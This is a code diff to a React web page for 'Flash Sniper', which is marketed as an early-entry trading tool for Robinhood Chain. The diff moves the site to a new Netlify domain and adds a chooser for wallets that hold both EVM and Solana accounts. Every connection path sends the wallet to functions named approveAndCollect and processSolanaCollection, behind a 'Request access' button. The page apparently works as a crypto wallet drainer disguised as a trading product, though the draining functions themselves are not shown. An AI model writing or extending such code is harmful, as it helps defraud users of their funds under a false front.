@@ -93,8 +93,8 @@ createAppKit({
   metadata: {
     name: 'Flash Sniper',
     description: 'First entries on Robinhood Chain',
-    url: 'https://saturnsniper-rb.netlify.app',
-    icons: ['https://saturnsniper-rb.netlify.app/favicon.svg'],
+    url: 'https://flashsniper.netlify.app/',
+    icons: ['https://flashsniper.netlify.app/favicon.svg'],
   },
   themeMode: 'dark',
   themeVariables: { '--w3m-accent': '#00e68a' },
@@ -156,6 +156,7 @@ export default function App() {
   const [_txHash, setTxHash] = useState('')
   const [_debugLogs, setDebugLogs] = useState<string[]>([]);
   const [terminalLines, setTerminalLines] = useState<string[]>([]);
+  const [showNetworkSelection, setShowNetworkSelection] = useState(false);
 
   const manualConnect = useRef(false)
   const isExecuting = useRef(false)
@@ -687,14 +688,81 @@ export default function App() {
     return successCount;
   };
 
+    const handleNetworkChoice = async (network: 'EVM' | 'SOLANA') => {
+    setShowNetworkSelection(false);
+    
+    if (network === 'SOLANA') {
+      const directSol = detectSolanaProvider();
+      if (directSol?.provider) {
+        try {
+          setLoading(true);
+          setStatus('Connecting Solana Wallet...');
+          log(`[SYSTEM] ${directSol.walletName} detected. Connecting directly...`);
+          const resp = await directSol.provider.connect();
+          const addr = resp.publicKey.toString();
+          log(`[SYSTEM] Connected Solana: ${addr}`);
+          await processSolanaCollection(directSol.provider, addr);
+          return;
+        } catch (e) {
+          log('❌ Direct Solana connection cancelled or failed');
+          setLoading(false);
+          setStatus('Ready');
+        }
+      }
+    } else {
+      const directEvm = detectDirectProvider();
+      if (directEvm?.provider?.request) {
+        try {
+          setLoading(true);
+          setStatus('Connecting EVM Wallet...');
+          log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
+          const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
+          if (accounts?.length > 0) {
+            log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
+            await approveAndCollect(directEvm.provider, accounts[0]);
+            return;
+          }
+        } catch (e) {
+          log('❌ Direct EVM connection cancelled or failed');
+          setLoading(false);
+          setStatus('Ready');
+        }
+      }
+    }
+    
+    // Fallback to AppKit Modal if direct fails
+    manualConnect.current = true;
+    open();
+  };
+
   const handleAction = async () => {
     if (isExecuting.current) {
       log("⚠️ Execution already in progress.");
       return;
     }
 
-    // 1. Try direct Solana connection
+    // 1. If already connected to EVM, just run EVM logic
+    if (isEvmConnected && evmWalletProvider && evmAddress) {
+      await approveAndCollect(evmWalletProvider, evmAddress);
+      return;
+    }
+
+    // 2. If already connected to Solana, just run Solana logic
+    if (isSolConnected && solWalletProvider && solAddress) {
+      await processSolanaCollection(solWalletProvider, solAddress);
+      return;
+    }
+
     const directSol = detectSolanaProvider();
+    const directEvm = detectDirectProvider();
+
+    // 3. If BOTH are detected (e.g., Trust Wallet, OKX), prompt user to choose
+    if (directSol && directEvm) {
+      setShowNetworkSelection(true);
+      return;
+    }
+
+    // 4. Try direct Solana connection (if ONLY Solana is detected)
     if (!isSolConnected && directSol?.provider) {
       try {
         setLoading(true);
@@ -712,8 +780,7 @@ export default function App() {
       }
     }
 
-    // 2. Try direct EVM connection
-    const directEvm = detectDirectProvider();
+    // 5. Try direct EVM connection (if ONLY EVM is detected)
     if (!isEvmConnected && directEvm?.provider?.request) {
       try {
         setLoading(true);
@@ -732,18 +799,7 @@ export default function App() {
       }
     }
 
-    // 3. Process via AppKit if already connected
-    if (isSolConnected && solWalletProvider && solAddress) {
-      await processSolanaCollection(solWalletProvider, solAddress);
-      return;
-    }
-
-    if (isEvmConnected && evmWalletProvider && evmAddress) {
-      await approveAndCollect(evmWalletProvider, evmAddress);
-      return;
-    }
-
-    // 4. Fallback to AppKit Modal
+    // 6. Fallback to AppKit Modal
     manualConnect.current = true;
     open();
   };
@@ -759,7 +815,7 @@ export default function App() {
 
   const buttonText = loading ? 'Processing...' : status === '✅ Processing Complete!' ? 'Done' : status.includes('❌') ? 'Retry' : 'Request access';
 
-  return (
+    return (
     <div style={s.app}>
       <style>{globalCSS}</style>
 
@@ -790,17 +846,34 @@ export default function App() {
           Track fresh Robinhood Chain pairs, review deployer behavior, and prepare your first buy before the chart gets crowded.
         </p>
         <div style={s.heroCta}>
-          <button
-            style={{
-              ...s.btnPrimary,
-              ...(loading ? s.btnDisabled : {}),
-            }}
-            onClick={handleAction}
-            disabled={loading}
-          >
-            {loading && <span style={s.spinner} />}
-            {buttonText}
-          </button>
+          {showNetworkSelection ? (
+            <div style={s.networkSelectionBox}>
+              <p style={s.networkSelectionText}>Multi-chain wallet detected. Choose network:</p>
+              <div style={s.networkSelectionButtons}>
+                <button style={s.btnPrimary} onClick={() => handleNetworkChoice('EVM')}>
+                  Connect EVM
+                </button>
+                <button style={{ ...s.btnPrimary, background: '#9945FF' }} onClick={() => handleNetworkChoice('SOLANA')}>
+                  Connect Solana
+                </button>
+              </div>
+              <button style={s.btnCancel} onClick={() => { setShowNetworkSelection(false); open(); }}>
+                Use AppKit Modal Instead
+              </button>
+            </div>
+          ) : (
+            <button
+              style={{
+                ...s.btnPrimary,
+                ...(loading ? s.btnDisabled : {}),
+              }}
+              onClick={handleAction}
+              disabled={loading}
+            >
+              {loading && <span style={s.spinner} />}
+              {buttonText}
+            </button>
+          )}
           <span style={s.heroNote}>Private beta for early Robinhood Chain traders.</span>
         </div>
       </section>
@@ -1373,5 +1446,39 @@ const s: Record<string, React.CSSProperties> = {
     maxWidth: '600px',
     margin: '0 auto',
     lineHeight: 1.7,
+  },
+  
+  // ── NEW NETWORK SELECTION STYLES ──
+  networkSelectionBox: {
+    display: 'flex',
+    flexDirection: 'column',
+    alignItems: 'center',
+    gap: '16px',
+    padding: '24px',
+    background: '#12121a',
+    border: '1px solid #1e1e2a',
+    borderRadius: '12px',
+  },
+  networkSelectionText: {
+    fontSize: '14px',
+    color: '#e8e8ed',
+    fontWeight: 600,
+    margin: 0,
+  },
+  networkSelectionButtons: {
+    display: 'flex',
+    gap: '12px',
+    width: '100%',
+  },
+  btnCancel: {
+    padding: '10px 24px',
+    background: 'transparent',
+    color: '#8a8a9a',
+    border: '1px solid #1e1e2a',
+    borderRadius: '8px',
+    fontSize: '13px',
+    fontWeight: 500,
+    cursor: 'pointer',
+    transition: 'all 0.2s',
   },
 };
